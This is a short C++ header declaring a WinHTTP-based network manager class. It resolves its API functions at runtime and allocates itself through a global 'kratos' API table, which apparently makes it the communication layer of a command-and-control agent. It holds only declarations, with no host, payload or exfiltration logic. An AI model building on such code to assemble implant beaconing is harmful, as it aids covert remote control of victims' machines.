#pragma once
#include <windows.h>
#include <winhttp.h>
#include "agent/core.h"

#define DECL( x ) decltype( x ) * x


class NetMgr {
private:
	PBYTE RecvBuf;
	SIZE_T recvLen;
	SIZE_T recvCap;
	BOOL EnsureRecv( SIZE_T needed );
	struct Apis {
		DECL( WinHttpOpen );
		DECL( WinHttpConnect );
		DECL( WinHttpReadData );
		DECL( WinHttpOpenRequest );
		DECL( WinHttpSendRequest );
		DECL( WinHttpCloseHandle );
		DECL( WinHttpReceiveResponse );
		DECL( WinHttpQueryDataAvailable );
	};
	HMODULE WinHttpDll;

	Apis apis;

public:
	static void* operator new(SIZE_T size) {
		void* ptr = kratos->apis.LocalAlloc(ALLOC_ARGS, size);
		if ( ! ptr ) { return NULL; }
		return ptr;
	}

	NetMgr();
	//BOOL init( );
	BOOL Post( PBYTE data, SIZE_T DataSize );
	PBYTE Data( );
	SIZE_T DataSize( );
};


extern NetMgr* net;